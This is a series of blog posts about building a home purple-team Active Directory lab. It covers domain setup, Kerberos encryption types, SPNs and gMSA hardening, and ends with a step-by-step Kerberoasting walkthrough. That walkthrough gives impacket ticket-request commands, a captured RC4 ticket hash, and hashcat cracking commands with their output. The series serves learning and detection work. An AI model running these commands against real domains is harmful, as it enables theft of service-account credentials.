posts.title: Chakravyuha: I'm Building a Purple Team AD Lab - Here's the Plan
posts.brief: I've spent years building things - applications, websites, personal projects - but always from the builder's side. Make it work, ship it, move on. Security…
posts.html:
I've spent years building things - applications, websites, personal projects - but always from the builder's side. Make it work, ship it, move on. Security was never part of how I thought about those builds.

What pulled me toward security was wanting to understand how organizations actually handle it at an industry level, not just how to break something in a lab. CTFs and TryHackMe rooms teach you to attack. They don't teach you logging, SIEM, monitoring, threat intelligence, or why a defender's deception layer matters - none of that shows up in a room built around one flag.

I ran into that gap directly when I messaged Harpreet Singh after reading his red-team-vs-purple-team post on LinkedIn, asking whether deception layers like honeypots and canary tokens actually work the way they're described on paper. He told me they're more common in mature enterprises than most people assume - Thinkst Canary, Microsoft Defender for Identity's decoy objects, and the identity-protection suites from CrowdStrike and SentinelOne all ship deception features by default now. Against automated tooling - mass Kerberoasting scans, a BloodHound collection - they work well, because the tooling doesn't discriminate. Against a careful manual operator, it comes down to engineering: a wrong pwdLastSet, a lastLogon that's too recent or never set, an odd SPN string - any of those gives a decoy away, and getting them right is a skill offense-only learning never touches.

That conversation was a small example of a bigger gap I kept hitting. I knew what logging was. I knew what a SIEM did, on paper. But when interviews actually asked me about them, I had nothing real to point to - just concepts I'd read, not things I'd done. I could have closed that gap with an online SOC simulator or a guided lab, but that's not how I learn well. I'd rather hit the real, unscripted version of a problem and work through it myself than have it pre-packaged for me. So instead of another course, I decided to build the thing itself - a lab where I'd actually have to think about logging, detection, and monitoring, not just execution.

I'm a B.Sc. Electronics (Honours) graduate from the University of Delhi working toward my first full-time SOC Analyst role. I completed the RISE Cybersecurity & Ethical Hacking Internship and hold the Google Cybersecurity Certificate.

TL;DR for recruiters / hiring managers

  • What this is: A purple-team Active Directory lab - offense, defense, and architecture together, not just an attack showcase.
  • What's different: A built-in deception layer, Sigma rules written from scratch, and every module following Attack → Detect → Respond → Harden.
  • Why it exists: I kept failing to answer logging/SIEM/monitoring questions in interviews with real hands-on experience behind them. This is me closing that gap the way I actually learn - by building the real thing, not simulating it.

The Setup

I started with DC-01, a Windows Server 2022 domain controller, because every Active Directory environment starts there. It handles authentication, stores the directory, and provides DNS so every machine inside the domain can find each other.

Once the domain was running, I added SRV-01, a Windows Server 2019 file server. This isn't just another Windows machine - it gives the lab realistic services to attack. Service accounts, shared folders, and Service Principal Names (SPNs) create the conditions needed for techniques like Kerberoasting while still looking like something you'd expect to find in a small company.

Next came WS-01 and WS-02, two Windows 10 Enterprise workstations joined to the domain. These represent everyday employee machines. They generate normal logon activity, create realistic lateral movement paths, and provide endpoints where security monitoring actually matters.

After the Windows infrastructure was ready, I deployed a dedicated Ubuntu SIEM server running Wazuh. A SIEM platform collects logs from every Windows machine so I can see attacks from the defender's point of view instead of only from the attacker's. Sysmon extends the native Windows logs with detailed process, network, and registry telemetry that makes writing meaningful detections possible.

That verification mattered more than I expected. Early on, I found test events weren't reaching Wazuh's Discover view at all - not because the agents weren't sending them, but because the SIEM manager's root disk had filled up with old archive indices, which pushed OpenSearch into a block on new indices and silently broke Filebeat's ability to publish. The logs were arriving; they just weren't going anywhere I could see them. It's a small thing, but it's the difference between a pipeline that's "configured" and one that's actually confirmed working - and it's exactly the kind of failure a real SOC deals with, not something you'd hit running a scripted lab.

The build wasn't uninterrupted in other ways either - a couple of local power cuts corrupted VM state along the way, and snapshotting before any risky change went from "best practice I read about" to a habit I actually needed.

The final piece is a Kali Linux machine. It serves as the attack platform for every offensive exercise while staying separate from the rest of the environment. It has internet access only for updating tools, while all attack traffic stays inside an isolated host-only network.

Before I launch the first attack, I want the environment to look like a believable small business - not an empty domain built just to demonstrate one technique. Detection engineering is only meaningful when the environment behaves like one defenders might actually encounter.

What's Coming

  • Module 1 - Kerberoasting: Can a single weak service account expose the entire domain?
  • Module 2 - AS-REP Roasting: Sometimes the easiest credentials to steal never required authentication in the first place.
  • Module 3 - Pass-the-Hash: What happens when knowing the password becomes completely unnecessary?
  • Module 4 - BloodHound ACL Abuse: Small permission mistakes often become the biggest privilege escalation paths.
  • Module 5 - DCSync: Replication rights can be more dangerous than administrator rights.
  • Module 6 - Golden Ticket: What changes after an attacker effectively owns Kerberos itself?
  • Module 7 - LAPS Bypass: Even good defensive controls have assumptions worth testing.
  • Module 8 - Active Directory Certificate Services (ESC1): Certificates can become persistence mechanisms hiding in plain sight.
  • Module 9 - Purple Team Reporting: Every attack ends with detection, response, hardening, and lessons learned - not just screenshots of a successful exploit.

What Makes This Different

A deception layer is built into the lab from day one. Honey service accounts, seeded credentials, and canary documents exist before any attack begins. The goal isn't just to catch automated tools - it's to understand what makes a decoy believable enough to fool a human operator too.

Every detection rule is written from scratch. Community Sigma rules are an excellent starting point and widely used in the industry. For this project, I want to understand the telemetry behind every alert, so each attack results in a Sigma rule I write myself - that forces me to understand the Windows events instead of treating detection as copy-paste.

The environment follows Microsoft's Active Directory tiering model. Administrative accounts, servers, and user workstations are deliberately separated instead of living in one flat domain. That creates more realistic attack paths and makes defensive decisions easier to explain.

Every module maps to both MITRE ATT&CK and MITRE Engage. ATT&CK explains what the attacker is doing. Engage focuses on how defenders can influence and detect that attacker through deception and active defense. Looking at both frameworks together gives a more complete picture than studying either one alone.

A SOC analyst isn't hired just because they know how an attack works. They're hired because they can recognize it, investigate it, understand its impact, and recommend a practical fix. That's the gap I want this project to close. Every technique in Chakravyuha follows the same cycle: Attack → Detect → Respond → Harden. If I can't explain every stage of that process, I haven't really learned the technique.

This post is the starting point for the entire Chakravyuha series. I'll document every stage - from building the lab and understanding Active Directory to executing attacks, writing detections, and hardening the environment - with a new post roughly every week as the project progresses.

posts.title: Active Directory from Zero: What I Had to Learn Before I Could Break Anything
posts.brief: I'd used Windows my whole life with a single account, logging straight into whatever I wanted. So when I started setting up Organizational Units and Group…
posts.html:
I'd used Windows my whole life with a single account, logging straight into whatever I wanted. So when I started setting up Organizational Units and Group Policy for Chakravyuha: An Active Directory Purple Team Lab, the idea that a policy could reach into a specific OU and quietly restrict what a specific user could do on a specific machine was new territory - not in theory, but in the "I'm the one configuring this and have no intuition for it yet" sense.

I found out the hard way. I'd set a GPO restricting logon to specific workstations, and when I tried to RDP into one of my own machines afterward, I was locked out - by a policy I'd written myself, for a scenario I hadn't fully thought through. That was the moment the theory and the practice stopped being the same thing. Understanding that Kerberos handles authentication doesn't tell you anything about how a GPO decides where that authenticated user is allowed to actually log on.

Before I could get anywhere near Kerberoasting or any other attack, I needed a working domain - a domain controller, DNS, machines actually joined to the domain, an organizational structure that meant something, and Group Policy that did what I intended instead of what I assumed. None of that is the attack itself. But without it, there's no realistic environment to attack, no logs worth detecting against, and no way to tell whether a detection rule actually works or just happens to fire in an empty lab.

This post covers the Active Directory concepts I had to learn - and in a couple of places, learn by locking myself out - before moving into the offensive side of the lab.

TL;DR for recruiters / hiring managers

  • In plain English: Active Directory centralises identity, authentication, and administration across Windows environments.
  • What I built: A domain with a domain controller, DNS, a member server, two workstations, a tiered organisational structure, and Group Policy baselines - including a GPO that briefly locked me out of my own machine.
  • Why it matters for a SOC: understanding how a domain is supposed to behave is what makes it possible to recognise when something about an authentication event, a privilege change, or a policy looks wrong.

1. What Is Active Directory, Really?

Active Directory Domain Services (AD DS) is Microsoft's directory service for managing identities and resources across a Windows domain.

Picture an organisation with hundreds of employees, dozens of computers, and several administrators. Without a central directory, every account and permission would need managing machine by machine - slow, inconsistent, and hard to secure. AD solves that by keeping users, computers, groups, and organisational units in one directory, with authentication and policy mechanisms built around it.

In my lab, that directory lives on DC-01, a Windows Server 2022 box running AD DS, DNS, and the Key Distribution Center role. A few pieces make the whole thing work together:

  • Domain controller - DC-01, which authenticates users and holds the directory
  • The directory database - the persistent store of every object and its attributes
  • DNS - how domain members actually find DC-01 and the services it offers (more on this below - it bit me)
  • Kerberos - the authentication protocol underneath nearly everything
  • Group Policy - how configuration and restrictions get applied centrally (also bit me, in a more literal sense)

These pieces are connected, not separate. A suspicious login isn't just "a username" - it's an account, its group memberships, the service it authenticated to, and the event that logged it. Understanding how those pieces relate is what turns a log line into something an analyst can actually investigate.

2. Domain vs Tree vs Forest: Understanding the Structure

A domain, a tree, and a forest describe different levels of AD's logical structure. They're related, but not interchangeable, and I'd mixed them up more than once before building this out.

A domain is the administrative and identity-management unit. My domain is CORP.CHAKRAVYUH.LOCAL, with DC-01 as its domain controller and SRV-01, WS-01, and WS-02 joined to it as domain members rather than running on independent local accounts.

A tree is a hierarchy of domains sharing a contiguous DNS namespace - for example, corp.example.com and a child domain sales.corp.example.com. A tree is not an OU: a child domain is an entirely separate domain, where an OU is just a container inside one domain.

A forest is the broader structure: one or more domains sharing a schema, configuration data, and trust relationships. It's also a meaningful security boundary - compromising the right identity or directory control inside a forest can have consequences well beyond one workstation.

Chakravyuha is a single-domain forest. I didn't need multiple domains or trees to demonstrate authentication, tiered permissions, attack paths, or detection - one domain was enough to make all of that real.

Active Directory Forest
│
└── Domain: CORP.CHAKRAVYUH.LOCAL
    ├── OU: Tier 0 (DC-01)
    ├── OU: Tier 1 (SRV-01)
    ├── OU: Tier 2 (WS-01, WS-02)
    ├── Users
    ├── Groups
    └── Computers

![[Screenshot 2026-10-17 100452.png]](https://cdn.hashnode.com/uploads/covers/62ed3a7de3a3793580dfdd20/a5a5a8d5-53dd-481a-b958-b7b890435e94.png align="center")

The practical takeaway: a domain, a tree, and a forest describe different parts of the structure and trust relationships. Getting that straight makes it a lot easier to reason about where an object belongs and how far a compromise could actually spread.

3. Organisational Units vs Groups: The Confusion Worth Resolving Early

OUs and groups are easy to mix up, and setting up Chakravyuha's tiered model was where I actually felt that confusion rather than just reading about it.

Setting up the tiered admin model - separate accounts and groups for Tier 0, Tier 1, and Tier 2, each with their own scope and their own policies - was confusing before it clicked. It wasn't a single thing that broke; it was not yet having the mental model for why three different admin identities, each restricted to its own tier, mattered more than one admin account used everywhere. Once I understood that a Tier 0 credential typed into a Tier 2 workstation is only as safe as that workstation's security, the separation stopped being bureaucratic overhead and started being the actual point - it's the same reasoning real environments use to limit how far a single compromised account can reach.

Mechanically, the distinction is this: an OU organises objects and is what a GPO links to. A group manages membership and is what permissions get granted to. In Chakravyuha:

  • Tier 0 - DC-01, the domain controller itself
  • Tier 1 - SRV-01, the server tier
  • Tier 2 - WS-01 and WS-02, the workstations

Separate admin accounts exist for each tier - adm.t0.yash for DC-01 only, adm.t1.yash for SRV-01 only, adm.t2.yash for the workstations only - and none of them is meant to ever log on outside its own tier. That's the OU side: organisation and where policy applies.

The group side solves a different problem. The IT-Support group is granted local admin on both workstations through Group Policy, while the daily-use accounts on those machines (pnair, rdesai) are not members of it. That's a deliberate, specific permission relationship - not something you'd see just by looking at where an account sits in the OU structure.

That's the real lesson: seeing where a user sits in an OU doesn't tell you what they can actually do. Group membership, delegated permissions, and local group membership all matter too - and an analyst who only checks one of those is missing half the picture.

4. Group Policy: How Organisations Manage Windows at Scale - and How I Managed to Lock Myself Out

A Group Policy Object (GPO) is a set of configuration settings an administrator links to a domain, a site, or an OU, applied to the users or computers inside it. The alternative - configuring every machine by hand - doesn't scale and drifts out of sync fast.

In Chakravyuha, the Default Domain Policy sets password and account-lockout requirements, and a separate Workstation-Baseline-Restrictions GPO applies additional restrictions to the Tier 2 OU - including, as I found out directly, a logon restriction limiting which users could log on to which workstations.

![[Screenshot 2026-10-17 101053.png]](https://cdn.hashnode.com/uploads/covers/62ed3a7de3a3793580dfdd20/3108a40b-9f13-430e-bb92-2135564640dc.png align="center")

I'd set that restriction myself, as part of building out the Tier 2 environment properly, and then tried to RDP into one of my own workstations shortly after. I was locked out - by my own policy, on my own lab, because I hadn't fully thought through who the restriction actually applied to when I set it. It was a useful reminder that linking a GPO to an OU doesn't mean "this setting applies to everything underneath it, loosely" - it means exactly what you configured, applied precisely, whether or not you remembered every detail of what you configured.

Two things are worth being explicit about. First, a GPO can configure both user and computer settings - it's not limited to one type of object. Second, whether a given setting actually reaches a given object depends on scope, inheritance, enforcement, and security filtering - not just "is this OU under that GPO." I learned that distinction by tripping over it.

For a SOC analyst, this matters beyond the embarrassment of locking yourself out once. An unexpected change to a security-relevant GPO can weaken protections across an entire OU, not just one machine. Knowing what the intended baseline is supposed to be is what gives an analyst something real to compare an unexpected change against.

5. DNS: The Dependency That Makes Active Directory Discoverable

DNS is easy to think of as "names become IP addresses," and that's true - but in AD, its job runs deeper than that. Domain members use DNS, including SRV records, to actually locate domain controllers and the services on them. That matters most during domain join and authentication, and it's exactly where I ran into trouble - though not in the way I expected.

My first real DNS problem wasn't really DNS - it was networking underneath it. I'd set up two virtual networks in VMware, NAT and Host-Only, and DC-01 ended up reachable over whichever one actually answered. I'd assigned it a static Host-Only IP, 192.168.10.10, and that's the address every other machine and Wazuh were configured to expect. But querying 192.168.10.10 from another device returned nothing, while the NAT adapter's IP - which changed on every reboot - was the one actually answering.

The fix was at the VMware network console level, not inside Windows: I set the static IP as the default for each machine directly in VMware's network settings, removing the ambiguity before Windows ever saw it, rather than trying to force adapter priority from inside the guest OS. It's a small distinction, but it matters - a DNS record pointing at the right address doesn't help if the machine itself answers on a different one depending on boot order.

It's also a good example of why domain-join and authentication problems aren't always what they look like. Nothing about Kerberos or AD DS was actually broken here. The domain simply wasn't reachable at the address everything expected, which is exactly the kind of failure that looks like "authentication is broken" to someone who doesn't check connectivity first.

For a SOC analyst, that sequencing matters: check connectivity and name resolution before jumping to conclusions about credentials or Kerberos. It's the difference between a discovery problem and an authentication problem, and they look identical from the symptom alone.

6. NTDS.DIT: Where Active Directory Stores Its Directory Data

NTDS.DIT is the database file AD DS uses to store directory information on a domain controller - every user, group, computer, and attribute, along with sensitive authentication-related material in protected, non-plaintext form.

I'll admit Kerberos didn't click for me from documentation alone - two posts in particular made the authentication flow click in a way the official docs hadn't: a walkthrough of Kerberos authentication and an introduction to Active Directory concepts. Worth a read if AD and Kerberos still feel abstract at this point - they were the thing that made the rest of this build make sense.

Why should an aspiring SOC analyst care about a database file specifically? Because it explains why control over a domain controller is so consequential. An attacker with sufficiently powerful access - particularly replication rights - can obtain credential material affecting many identities across the domain, without ever touching the file directly. That's the premise behind DCSync: abusing directory replication rights to request sensitive directory data from a domain controller, rather than copying NTDS.DIT by hand. It depends on having those replication rights in the first place - not something an ordinary domain user can just do. I'll cover the technique and its detection later in this series.

7. Why These Foundations Matter for a SOC Analyst

The offensive case for learning AD is obvious - it explains where attack opportunities come from. But the same knowledge is just as load-bearing on the defensive side.

An unusual authentication event means little without understanding the domain controller, Kerberos, and the services involved. An unexpected privilege change is only meaningful if you understand the difference between where an account sits and what it actually has access to - which is the OU-vs-group distinction again. A policy change on a GPO linked to an OU can affect every machine under it, not just one endpoint - which I now understand a little more personally than I did before building this.

That's why Chakravyuha follows Attack → Detect → Respond → Harden for every module. I want each one to show not just that a technique works, but how it can be investigated, how a response would actually play out, and what changes would reduce the risk - built on an environment (DC-01, SRV-01, WS-01, WS-02, and a separate Ubuntu-based SIEM running Wazuh with Sysmon) real enough that those answers mean something.

A Tier 1 SOC analyst needs more than the ability to recognise an event ID. They need to understand the system that generated it, what normal looks like, the account's actual role, and what the activity could mean. That context is what AD fundamentals provide - and it's a lot more durable when a few of them were learned by locking yourself out of your own lab first.

Closing: The Foundation Before the Attack

Domains, forests, OUs, groups, Group Policy, DNS, and the directory database aren't disconnected topics to memorise. Together, they explain how identities are organised, how machines find domain services, how configuration actually gets enforced, and where the boundaries can fail - sometimes on the person configuring them.

The next post goes deeper into the piece holding much of this together: Kerberos authentication. I'll break down the authentication flow and explain why ticket encryption choices matter, before moving into Kerberoasting itself.

Understanding the foundation comes first. Now it's time to understand the protocol underneath it.

posts.title: Kerberos Authentication Explained - and Why RC4 Is a Problem
posts.brief: I didn't know Active Directory, so it was obvious Kerberos wasn't going to be my strong point either. Before I could understand Kerberoasting or any attack…
posts.html:
I didn't know Active Directory, so it was obvious Kerberos wasn't going to be my strong point either. Before I could understand Kerberoasting or any attack built on top of it, I had to go deeper into the authentication protocol itself - and that's where I ran into a second problem on top of the first.

I found exactly one explanation online that actually made Kerberos click for me. It's good - genuinely good - but it's also dense enough that I can see it losing someone who isn't already halfway there. That's a pattern I run into a lot with technical topics: the good explanations assume you're already close to understanding the thing they're explaining. I think in logic and real-world examples, not acronyms and protocol diagrams, and when something doesn't map to a concrete scenario in my head, it doesn't actually stick - it just gets memorized until the next time I need it.

So this post is my attempt at the explanation I wish I'd found first. If you already know Kerberos cold, you probably won't need it. If you're where I was, I'm hoping it saves you the few hours I spent being quietly confused by acronyms that all start with the same three letters.

TL;DR for recruiters / hiring managers

  • In plain English: Kerberos is how Windows domains prove who you are without ever sending your password across the network - it uses encrypted "tickets" instead.
  • Why it matters here: Kerberoasting, the first attack in this series, specifically abuses a weak link in how one type of ticket gets encrypted.
  • What I verified: I captured real Kerberos traffic in my own lab to confirm, rather than assume, which encryption types are actually in play - and found the answer wasn't what I expected going in.

The Amusement Park, Not the RFC

Here's the mental model that actually made this click for me: Kerberos authentication is a lot like a day at an amusement park with a wristband system.

You show up at the gate and prove who you are - a ticket purchase, ID checked. In exchange, you get a wristband. The wristband doesn't get you on any ride directly. What it does is prove, instantly and without re-checking your ID every time, that you're a paying guest who's allowed to be in the park.

Later, you walk up to a specific ride - say, the roller coaster - and show your wristband. The ride operator doesn't re-verify your identity from scratch. They trust the wristband, and in exchange, they hand you a ride ticket - something specific to that one ride, for that one visit. You hand the ride ticket to the person running the coaster, and you're on.

That's the whole shape of Kerberos, with the jargon mapped on:

  • Proving who you are at the gate → the AS-REQ (Authentication Service Request) - you ask the Domain Controller's Key Distribution Center (KDC) to vouch for you.
  • Getting the wristband → the AS-REP (Authentication Service Reply) - the KDC hands you a Ticket Granting Ticket (TGT). This is your wristband: proof you're a legitimate, authenticated user in the domain, good for a while.
  • Walking up to a specific ride and showing your wristband → the TGS-REQ (Ticket Granting Service Request) - you present your TGT to ask for access to one specific service, like a file share or a SQL database.
  • Getting the ride ticket → the TGS-REP (Ticket Granting Service Reply) - you receive a service ticket, specific to that one service, that you hand over to actually use it.

The reason this matters for security - and the reason Kerberos exists at all instead of "just send the password every time" - is that your password never leaves your machine during any of this. The KDC and your machine prove things to each other using cryptography derived from your password, not the password itself. That's a meaningfully different, much safer design than the password-over-the-wire model it replaced.

In my lab, this whole exchange happens between a workstation like WS-02 and DC-01, the domain controller running the KDC role for CORP.CHAKRAVYUH.LOCAL.

Why the Ticket's Encryption Is the Part That Actually Matters

Here's where the post's title comes in, and where the analogy needs one more detail: the wristband and the ride ticket aren't just pieces of paper - they're encrypted. And how they're encrypted is a choice, negotiated between your machine and the KDC, not a fixed property of Kerberos itself.

Two encryption types matter most in a modern Windows domain:

  • RC4 (etype 23, 0x17) - an older algorithm. It's weaker, and critically, the key derived from it is based directly on the account's password hash - which means if an attacker gets hold of an RC4-encrypted ticket, they can attempt to crack it offline, at their own pace, with no further contact with the domain. No lockout policy helps you here, because the cracking attempt never touches the network.
  • AES-128 / AES-256 (etype 17 / 18) - the modern standard. Significantly harder to crack offline, and the default preference in any reasonably current Windows domain.

Why does this matter practically? Because a ticket's encryption type is effectively decided per-account, not per-domain. If an account's msDS-SupportedEncryptionTypes attribute allows RC4 - whether because it was deliberately set that way, left unset on an older-style account, or just never touched - any ticket issued for that account can come back RC4-encrypted even in a domain where everything else uses AES.

That's not a hypothetical. I checked it directly in my own lab rather than assuming it from documentation.

What I Actually Found When I Checked

I wanted to see this for myself rather than take documentation at its word, so I captured it directly. A normal user logon's AS-REQ in my domain offers several encryption types, RC4 included - but DC-01 actually selects AES256 for the response. I checked whether that was something I'd configured: it wasn't. The account itself has no explicit encryption-type setting, and my domain's GPO baseline leaves the relevant Kerberos encryption policy at "Not Defined." At Windows2016Domain functional level, AES is simply what a modern domain and a modern client negotiate by default when both support it - RC4 gets offered mainly for backward compatibility, not because anything's forcing it.

That distinction - what's negotiated by default versus what has to be deliberately configured - turned out to matter a lot for one particular account in this lab, the one this series' first attack module is built around. That part of the story belongs in the Kerberoasting post itself, not here.

Why This Matters Beyond One Attack

Understanding this flow isn't just prep for one technique. For a SOC analyst, it reframes what an event like 4768 (AS-REQ/AS-REP) or 4769 (TGS-REQ/TGS-REP) actually represents in a log: not an abstract "authentication happened," but a specific step in a trust chain, with a specific encryption choice attached to it - a choice that's either a safe default or a quiet weakness, depending entirely on that one account's configuration.

That's also why "RC4 is still allowed" is rarely a domain-wide failure in a modern environment. It's almost always an account-by-account gap - a service account created years ago, never revisited, still accepting the weaker option while everything else around it moved on. Finding that gap is less about scanning the whole domain and more about knowing which accounts to actually check.

Next: The Attack Surface Most People Don't Even Think to Look For

Knowing how tickets work is half the picture. The other half is knowing what makes an account a target in the first place - and that comes down to one attribute most people never think to look at: the Service Principal Name.

That's where this series goes next.

posts.title: SPNs: The Attack Surface Most People Don't Talk About
posts.brief: A Service Principal Name (SPN) looks like this: That's ServiceClass/Host:Port — in this case, telling Kerberos "this is a SQL Server service, running on…
posts.html:
A Service Principal Name (SPN) looks like this:

MSSQLSvc/srv-01.corp.chakravyuh.local:1433

That's ServiceClass/Host:Port — in this case, telling Kerberos "this is a SQL Server service, running on srv-01.corp.chakravyuh.local, listening on port 1433." An SPN is how a client finds the right service to request a ticket for. Without it, Kerberos has no way to know which account in the domain is actually "the SQL service" versus just another user.

That sounds mundane. It's also, as it turns out, the entire reason Kerberoasting exists as an attack.

TL;DR for recruiters / hiring managers

  • In plain English: An SPN is a label that ties a Windows service to the account that runs it, so Kerberos can issue it tickets.
  • Why it's risky: If that account is a regular user account with a weak, human-chosen password, anyone who can request a ticket for it can try to crack that password offline — no further access to the domain needed.
  • What I built: I didn't just explain the fix — I implemented a Group Managed Service Account (gMSA) in my own lab and migrated the real SPN to it, with the before/after visible in Active Directory.

Registering One

Registering an SPN is a single command:

setspn -A MSSQLSvc/srv-01.corp.chakravyuh.local:1433 svc.sqlsvc

This ties that SPN to svc.sqlsvc — telling the domain "requests for this SQL service should get tickets encrypted against this account's credentials." I ran this myself when building the lab, and it went cleanly — no format errors, no duplicate-SPN conflicts, which is honestly the more common outcome than people expect. The confusion in SPNs isn't usually in registering them. It's in what registering one on the wrong kind of account actually means.

Why the Account Type Matters More Than the SPN Itself

Here's the distinction that makes this whole topic matter: a computer account in Active Directory (like SRV-01$) has its password managed automatically by Windows — a long, random value, rotated on a schedule, that no human ever sees or chooses. A user account — the kind IT staff create for "the SQL service" or "the backup job" — has a password a person set, the same way any other user account does.

Both account types can hold an SPN. Only one of them is dangerous to hold one.

When Kerberos issues a service ticket for an SPN, part of that ticket is encrypted using a key derived from the SPN-holding account's password. If that account is a computer account, the key is derived from effectively random data — nothing meaningful to crack. If it's a user account with a password like svc.sqlsvc's Welcome2023! — a dictionary word, a capital letter, a year — an attacker who captures that ticket doesn't need any more access to the domain to attack it. They take the ticket offline and try to guess the password against it, at whatever speed their hardware allows, completely outside the domain's visibility.

That's Kerberoasting in one sentence: any authenticated domain user can request a service ticket for any SPN in the domain, and if that SPN sits on a weak user account, the ticket is a standing invitation to an offline password-cracking attempt. No exploit, no malware — just a normal, logged, "legitimate-looking" ticket request.

Finding Every SPN in a Domain

An attacker doesn't need insider knowledge to find SPN-holding accounts — the domain will list them for anyone who asks: ```

setspn -T CORP -Q _/_

Running this in my own lab against CORP.CHAKRAVYUH.LOCAL returned every registered SPN in the domain — the domain controller's own service SPNs, SRV-01's host and WSMAN entries, and, critically:

CN=svc.sqlsvc,OU=Service Accounts,DC=corp,DC=chakravyuh,DC=local  
MSSQLSvc/srv-01.corp.chakravyuh.local:1433

One line of unauthenticated-feeling, completely ordinary-looking enumeration, and the target account is identified by name, OU, and exact SPN. This is the step GetUserSPNs.py and similar tools automate — but the underlying technique is this simple. Anyone who can query the domain can run this.

I also checked the account directly in Active Directory Users and Computers — opening svc.sqlsvc's properties and looking at the servicePrincipalName attribute in the Attribute Editor confirms the exact same value the command line showed: MSSQLSvc/srv-01.corp.chakravyuh.local:1433. Same fact, two different views — the command line for scale, the GUI for confirming you're looking at the right object.

The Fix: Removing the Password Entirely

Here's the thing about hardening an account's encryption type (which I cover in the next posts): it's real, and it genuinely raises the cost of attacking an account like svc.sqlsvc significantly. But it doesn't remove the actual root weakness. The service ticket is still encrypted with a key ultimately derived from a human-chosen password. Hardening the encryption makes that password much slower to crack offline. It doesn't make the password itself any less guessable.

The real industry answer to "an SPN'd account has a weak, static, human-managed password" isn't a better password. It's removing the human from that equation entirely — which is what a Group Managed Service Account (gMSA) does.

A gMSA's password is 120 random characters, generated and managed by Active Directory itself, and automatically rotated on a schedule. No person ever knows it, types it, or has to remember to change it. Only the specific machines you authorize can even retrieve it — and they do that automatically, through AD, not through a config file with a password sitting in it.

I built one of these in my lab rather than just describing it:

# On DC-01 — one-time, forest-wide (lab-only flag to skip the normal 10-hour propagation wait)
Add-KdsRootKey -EffectiveImmediately

# Create the gMSA, restricted to the one machine that should ever use it
New-ADServiceAccount -Name "gmsa.sqlsvc" `
  -DNSHostName "gmsa.sqlsvc.corp.chakravyuh.local" `
  -PrincipalsAllowedToRetrieveManagedPassword "SRV-01$"

# Move the real SPN from the old account to the new one
SetSPN -A MSSQLSvc/srv-01.corp.chakravyuh.local:1433 gmsa.sqlsvc
SetSPN -D MSSQLSvc/srv-01.corp.chakravyuh.local:1433 svc.sqlsvc

# On SRV-01 — the only machine authorized to use this account
Install-ADServiceAccount -Identity gmsa.sqlsvc
Test-ADServiceAccount -Identity gmsa.sqlsvc
# → True

That True matters — it's not just "the object exists," it's confirmation that SRV-01 specifically can retrieve and use the account's password, and nothing else can.

In Active Directory Users and Computers, the difference is immediately visible: svc.sqlsvc sits in Service Accounts as an ordinary User object. gmsa.sqlsvc sits in Managed Service Accounts, with an object class of msDS-GroupManagedServiceAccount — a fundamentally different kind of object, not just a user with a longer password.

svc.sqlsvc still exists in the domain — I didn't delete it, since it's documented throughout this project as the original target. But it no longer holds the SPN, which means it's no longer something Kerberoasting can target at all. The actual attack surface moved to gmsa.sqlsvc, and that account simply doesn't have a crackable password to find.

That's the real lesson underneath this whole post: an SPN by itself isn't the vulnerability. A user account holding an SPN, with a password a person chose, is. Move the SPN to an account type that was never given a human-guessable password in the first place, and the attack doesn't have anything left to work with.

Next: Actually Running the Attack

Everything up to this point — the AD fundamentals, the Kerberos flow, the SPN mechanics — has been setup. The next post is where this series stops explaining and starts attacking: requesting a real service ticket against a deliberately weak account, taking it offline, and cracking it.

posts.html:
Post 3 covered the mechanics: any authenticated domain user can request a service ticket for any SPN-holding account, and if that account is a regular user object with a weak password, the ticket is a standing invitation to crack offline. This post is where that stops being theory. I ran the attack against svc.sqlsvc myself, as a completely ordinary domain user - no special privileges, no admin rights - and had the password in under a second.

TL;DR for recruiters / hiring managers

  • What I did: Enumerated SPN-holding accounts from Kali, requested a real Kerberos service ticket as a low-privilege domain user, extracted the hash, and cracked it offline with hashcat.
  • Why it matters: This requires zero exploits, zero malware, and zero elevated access - just a normal, Kerberos-compliant ticket request that looks unremarkable in a log unless you know what to check.
  • What's next: Post 5 covers how I caught myself doing this, with a detection rule built from scratch.

Prerequisites, Quick Recap

From Post 3: svc.sqlsvc holds a real SPN (MSSQLSvc/srv-01.corp.chakravyuh.local:1433), it's a user account rather than a computer or gMSA account, and at the time of this attack its msDS-SupportedEncryptionTypes still allowed RC4. That's the entire setup this attack needs.

I ran everything from Kali, authenticated as pnair - the ordinary Finance-tier domain user from WS-01, with no admin rights of any kind. That's deliberate. This attack doesn't need a privileged account; it needs an authenticated one.

Step 1: Enumerate

impacket-GetUserSPNs corp.chakravyuh.local/pnair -dc-ip 192.168.10.10

This asks the domain, as pnair, which accounts hold SPNs - the same enumeration Post 3 covered, just run from the attacker's own machine this time rather than from inside the domain as an admin. The output confirmed svc.sqlsvc, with its PasswordLastSet and LastLogon values visible - useful attacker reconnaissance on its own, since an account whose password hasn't rotated in months is a signal worth noticing before spending time attacking it.

I ran this enumeration as an early validation step, before the real attack - specifically to confirm the request itself would generate the right telemetry in Wazuh once I actually went for it. Getting the mechanics right before treating a session as "the real attempt" mattered more to me than getting a fast result.

Step 2: Request the Ticket

Same tool, one flag added:

impacket-GetUserSPNs corp.chakravyuh.local/pnair -dc-ip 192.168.10.10 -request

The -request flag doesn't just list the SPN - it actually requests a TGS ticket for it and prints the ticket's encrypted portion directly to the terminal, formatted as a $krb5tgs$ hash ready for cracking. This is the moment the attack actually happens: a completely normal, protocol-compliant Kerberos request, indistinguishable at a glance from a legitimate service authenticating to svc.sqlsvc.

Step 3: Extract the Hash

I saved the printed output directly to a file:

kerberoast_hash.txt

$krb5tgs$23$*svc.sqlsvc$CORP.CHAKRAVYUH.LOCAL$CORP.CHAKRAVYUH.LOCAL/svc.sqlsvc*$3d0724a76199b96ff2e3ed5b853809d2$b9b3351f504c15c94c776ec8954...

That $23$ right after $krb5tgs$ is worth pointing at specifically - it's the hash format's own label for the Kerberos encryption type used, and 23 is RC4. The hash format is telling you, before you even try to crack it, exactly why this account was crackable in the first place.

Step 4: Crack It Offline

echo -e “Welcome\nWelcome1\nSummer\nSpring\nPassword\nCompany” > corp_words.txt  
hashcat -m 13100 kerberoast_hash.txt corp_words.txt ?d?d?d?d?s

Mode 13100 is hashcat's dedicated mode for exactly this hash type - Kerberos 5, etype 23, TGS-REP. I didn't reach for rockyou.txt. Instead I built a tiny, deliberately targeted wordlist of six words that fit a plausible corporate password pattern, combined with a mask (?d?d?d?d?s) appending four digits and a symbol - the kind of guess an attacker makes about this specific environment, not a brute-force sweep of every password ever leaked.

It cracked in under a second.

Session...........: hashcat  
Status.............: Cracked  
Hash.Mode..........: 13100 (Kerberos 5, etype 23, TGS-REP)  
Recovered..........: 1/1 (100.00%) Digests (new)  
